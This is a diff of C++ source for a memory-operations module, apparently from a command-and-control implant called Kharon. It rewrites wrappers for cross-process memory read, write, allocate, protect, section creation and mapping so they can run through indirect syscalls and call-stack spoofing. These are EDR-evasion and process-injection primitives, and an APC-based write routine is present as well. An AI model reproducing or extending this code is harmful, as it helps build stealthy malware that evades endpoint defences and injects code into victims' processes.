@@ -4,74 +4,128 @@ auto DECLFN Memory::Read(
     _In_  PVOID   Base,
     _In_  BYTE*   Buffer,
     _In_  SIZE_T  Size,
-    _Out_ SIZE_T* Reads,
+    _Out_ PSIZE_T Reads,
     _In_  HANDLE  Handle
 ) -> BOOL {
-    G_KHARON
-    return Self->Krnl32.ReadProcessMemory( Handle, Base, Buffer, Size, Reads );
+    const UINT32 Flags = SYSCALL_FLAGS;
+    NTSTATUS    Status = STATUS_UNSUCCESSFUL;
+
+    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+        return NT_SUCCESS( Self->Ntdll.NtReadVirtualMemory(
+            Handle, Base, Buffer, Size, (PULONG)Reads
+        ));
+    }
+
+    UPTR Address = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::Read].Instruction
+        : (UPTR)Self->Ntdll.NtReadVirtualMemory;
+
+    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::Read].ssn
+        : 0;
+
+
+    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
+        SyscallExec( Sys::Read, Status, Handle, Base, Buffer, Size, Reads )
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)Handle, (UPTR)Base,
+            (UPTR)Buffer, (UPTR)Size, (UPTR)Reads
+        );
+    }
+
+    Self->Usf->NtStatusToError(Status);
+
+    return NT_SUCCESS(Status);
 }
 
 auto DECLFN Memory::Alloc(
-    _In_ PVOID Base,
-    _In_ ULONG Size,
-    _In_ ULONG AllocType,
-    _In_ ULONG Protect,
-    _In_ HANDLE Handle
+    _In_  PVOID   Base,
+    _In_  SIZE_T  Size,
+    _In_  ULONG   AllocType,
+    _In_  ULONG   Protect,
+    _In_  HANDLE  Handle
 ) -> PVOID {
-    G_KHARON
-    PVOID BaseAddress = NULL;
+    const UINT32 Flags = SYSCALL_FLAGS;
 
-    if ( Self->Sys->Enabled ) {
-        NTSTATUS Status = 0;
-        PVOID    TmpPtr = Base;
-        SIZE_T   SizeT  = Size;
+    NTSTATUS Status      = STATUS_UNSUCCESSFUL;
+    PVOID    BaseAddress = Base;
+    SIZE_T   RegionSize  = Size;
 
-        if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();
+    if (!Handle || Handle == INVALID_HANDLE_VALUE) {
+        Handle = NtCurrentProcess();
+    }
 
-        SyscallExec( Sys::Alloc, Status, Handle, &TmpPtr, 0, &SizeT, AllocType, Protect );
-
-        BaseAddress = TmpPtr;
-        Self->Usf->NtStatusToError( Status );
-    } else {
-        if ( Handle ) {
-            BaseAddress = Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
+    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+        if ( Handle == NtCurrentProcess() ) {
+            return Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
         } else {
-            BaseAddress = Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
+            return Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
         }
     }
 
-    return BaseAddress;
+    UPTR Address = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::Alloc].Instruction
+        : (UPTR)Self->Ntdll.NtAllocateVirtualMemory;
+
+    UPTR ssn = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::Alloc].ssn
+        : 0;
+
+
+    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
+        SyscallExec( Sys::Alloc, Status, Handle, &BaseAddress, 0, &RegionSize, AllocType, Protect );
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)Handle, (UPTR)&BaseAddress,
+            0, (UPTR)&RegionSize, (UPTR)AllocType, (UPTR)Protect
+        );
+    }
+    
+    Self->Usf->NtStatusToError(Status);
+    
+    return NT_SUCCESS( Status ) ? BaseAddress : nullptr;
 }
 
 auto DECLFN Memory::Protect(
-    _In_  PVOID  Base,
-    _In_  ULONG  Size,
-    _In_  ULONG  NewProt,
-    _Out_ ULONG* OldProt,
-    _In_  HANDLE Handle
+    _In_  PVOID   Base,
+    _In_  SIZE_T  Size,
+    _In_  ULONG   NewProt,
+    _Out_ ULONG  *OldProt,
+    _In_  HANDLE  Handle
 ) -> BOOL {
-    G_KHARON
-    BOOL Success = FALSE;
+    const UINT32 Flags  = SYSCALL_FLAGS;
+    NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
-    if ( Self->Sys->Enabled ) {
-        NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
-        if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();
-
-        SyscallExec( Sys::Protect, Status, Handle, Base, Size, NewProt, OldProt );
-        Self->Usf->NtStatusToError( Status );
-
-        if   ( Status == STATUS_SUCCESS ) Success = TRUE;
-        else   Success = FALSE;
-    } else {
-        if ( Handle ) {
-            Success = Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
+    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+        if ( Handle == NtCurrentProcess() ) {
+            return Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
         } else {
-            Success = Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
+            return Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
         }
     }
 
-    return Success;
+    UPTR Address = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::Protect].Instruction
+        : (UPTR)Self->Ntdll.NtProtectVirtualMemory;
+
+    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::Protect].ssn
+        : 0;
+
+    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
+        SyscallExec( Sys::Protect, Status, Handle, &Base, &Size, NewProt, OldProt );
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)Handle, (UPTR)&Base,
+            (UPTR)&Size, (UPTR)NewProt, (UPTR)OldProt
+        );
+    }
+
+    Self->Usf->NtStatusToError( Status );
+
+    return NT_SUCCESS( Status );
 }
 
 auto DECLFN Memory::WriteAPC(
@@ -81,8 +135,8 @@ auto DECLFN Memory::WriteAPC(
     _In_ ULONG  Size
 ) -> BOOL {
     G_KHARON
-    HANDLE      ThreadHandle = NULL;
-    NTSTATUS    NtStatus     = STATUS_SUCCESS;
+    HANDLE   ThreadHandle = NULL;
+    NTSTATUS NtStatus     = STATUS_SUCCESS;
 
     ULONG ThreadId = 0;
     PVOID Dummy    = (PVOID)1;
@@ -114,80 +168,168 @@ auto DECLFN Memory::Write(
     _In_ ULONG  Size,
     _In_ HANDLE Handle
 ) -> BOOL {
-    G_KHARON
-    BOOL      Success = FALSE;
-    ULONG_PTR Written = 0;
+    const UINT32 Flags   = SYSCALL_FLAGS;
+    NTSTATUS     Status  = STATUS_UNSUCCESSFUL;
+    SIZE_T       Written = 0;
 
-    if ( Self->Sys->Enabled ) {
-        NTSTATUS Status = STATUS_UNSUCCESSFUL;
-
-        SyscallExec( Sys::Write, Status, Handle, Base, Buffer, Size, &Written );
-        Self->Usf->NtStatusToError( Status );
-
-        if   ( Status == STATUS_SUCCESS ) Success = TRUE;
-        else   Success = FALSE;
-    } else {
-        Success = Self->Krnl32.WriteProcessMemory( Handle, Base, Buffer, Size, &Written );
+    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+        return NT_SUCCESS( Self->Ntdll.NtWriteVirtualMemory(
+            Handle, Base, Buffer, Size, &Written
+        ));
     }
 
-    return Success;
+    UPTR Address = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::Write].Instruction
+        : (UPTR)Self->Ntdll.NtWriteVirtualMemory;
+
+    UPTR ssn = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::Write].ssn
+        : 0;
+
+
+    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
+        SyscallExec( Sys::Write, Status, Handle, Base, Buffer, Size, &Written );
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)Handle, (UPTR)Base,
+            (UPTR)Buffer, (UPTR)Size, (UPTR)&Written
+        );
+    }
+    
+    Self->Usf->NtStatusToError( Status );
+
+    return NT_SUCCESS( Status );
 }
 
 auto DECLFN Memory::Free(
     _In_ PVOID  Base,
-    _In_ ULONG  Size,
+    _In_ SIZE_T Size,
     _In_ ULONG  FreeType,
     _In_ HANDLE Handle
 ) -> BOOL {
-    G_KHARON
-    if ( !Handle ) {
-        return Self->Krnl32.VirtualFree( Base, Size, FreeType );
-    } else {
-        return Self->Krnl32.VirtualFreeEx( Handle, Base, Size, FreeType );
+    const UINT32 Flags  = SYSCALL_FLAGS;
+    NTSTATUS     Status = STATUS_UNSUCCESSFUL;
+
+    if ( ! Handle ) {
+        if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+            return NT_SUCCESS( Self->Ntdll.NtFreeVirtualMemory(
+                Handle, &Base, &Size, FreeType
+            ));
+        }
     }
+
+    UPTR Address = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::Free].Instruction
+        : (UPTR)Self->Ntdll.NtFreeVirtualMemory;
+
+    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::Free].ssn
+        : 0;
+
+    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
+        SyscallExec( Sys::Free, Status, Handle, &Base, &Size, FreeType );
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)Handle, (UPTR)&Base, (UPTR)&Size, (UPTR)FreeType
+        );
+    }
+
+    Self->Usf->NtStatusToError( Status );
+
+    return NT_SUCCESS( Status );
 }
 
 auto DECLFN Memory::MapView(
     _In_        HANDLE          SectionHandle,
     _In_        HANDLE          ProcessHandle,
-    _Inout_     PVOID           *BaseAddress,
+    _Inout_     PVOID*          BaseAddress,
     _In_        ULONG_PTR       ZeroBits,
     _In_        SIZE_T          CommitSize,
-    _Inout_opt_ LARGE_INTEGER*  SectionOffset,
-    _Inout_     SIZE_T*         ViewSize,
+    _Inout_opt_ PLARGE_INTEGER  SectionOffset,
+    _Inout_     PSIZE_T         ViewSize,
     _In_        SECTION_INHERIT InheritDisposition,
     _In_        ULONG           AllocationType,
     _In_        ULONG           PageProtection
-) -> LONG {
-    G_KHARON
-    LONG RetStatus = STATUS_UNSUCCESSFUL;
+) -> NTSTATUS {
+    const UINT32 Flags = SYSCALL_FLAGS;
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
-    if ( Self->Sys->Enabled ) {
-        SyscallExec( Sys::MapView, RetStatus, SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, PageProtection );
-    } else {
-        RetStatus = Self->Ntdll.NtMapViewOfSection( SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, PageProtection );
+    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+        return Self->Ntdll.NtMapViewOfSection(
+            SectionHandle, ProcessHandle, BaseAddress, ZeroBits,
+            CommitSize, SectionOffset, ViewSize, InheritDisposition,
+            AllocationType, PageProtection
+        );
     }
-    
-    return RetStatus;
+
+    UPTR Address = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::MapView].Instruction
+        : (UPTR)Self->Ntdll.NtMapViewOfSection;
+
+    UPTR ssn = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::MapView].ssn
+        : 0;
+
+
+    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
+        SyscallExec( 
+            Sys::MapView, Status, SectionHandle, ProcessHandle, BaseAddress, 
+            ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition,
+            AllocationType, PageProtection 
+        );
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)SectionHandle, (UPTR)ProcessHandle,
+            (UPTR)BaseAddress, (UPTR)ZeroBits, (UPTR)CommitSize,
+            (UPTR)SectionOffset, (UPTR)ViewSize, (UPTR)InheritDisposition,
+            (UPTR)AllocationType, (UPTR)PageProtection
+        );
+    }
+
+    return Status;
 }
 
 auto DECLFN Memory::CreateSection(
-    _Out_    HANDLE*            SectionHandle,
-    _In_     ACCESS_MASK        DesiredAccess,
+    _Out_    PHANDLE           SectionHandle,
+    _In_     ACCESS_MASK       DesiredAccess,
     _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
-    _In_opt_ LARGE_INTEGER*     MaximumSize,
-    _In_     ULONG              SectionPageProtection,
-    _In_     ULONG              AllocationAttributes,
-    _In_opt_ HANDLE             FileHandle
-) -> LONG {
-    G_KHARON
-    LONG RetStatus = STATUS_UNSUCCESSFUL;
+    _In_opt_ PLARGE_INTEGER    MaximumSize,
+    _In_     ULONG             SectionPageProtection,
+    _In_     ULONG             AllocationAttributes,
+    _In_opt_ HANDLE            FileHandle
+) -> NTSTATUS {
+    const UINT32 Flags = SYSCALL_FLAGS;
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
-    if ( Self->Sys->Enabled ) {
-        SyscallExec( Sys::CrSectn, RetStatus, SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle );
-    } else {
-        RetStatus = Self->Ntdll.NtCreateSection( SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle );
+    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+        return Self->Ntdll.NtCreateSection(
+            SectionHandle, DesiredAccess, ObjectAttributes,
+            MaximumSize, SectionPageProtection, AllocationAttributes,
+            FileHandle
+        );
     }
-    
-    return RetStatus;
+
+    UPTR Address = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::CrSectn].Instruction
+        : (UPTR)Self->Ntdll.NtCreateSection;
+
+    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
+        ? (UPTR)Self->Sys->Ext[Sys::CrSectn].ssn
+        : 0;
+
+    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
+        SyscallExec( 
+            Sys::CrSectn, Status, SectionHandle, DesiredAccess, ObjectAttributes,
+            MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle
+        );
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)SectionHandle, (UPTR)DesiredAccess,
+            (UPTR)ObjectAttributes, (UPTR)MaximumSize,
+            (UPTR)SectionPageProtection, (UPTR)AllocationAttributes,
+            (UPTR)FileHandle
+        );
+    }
+
+    return Status;
 }
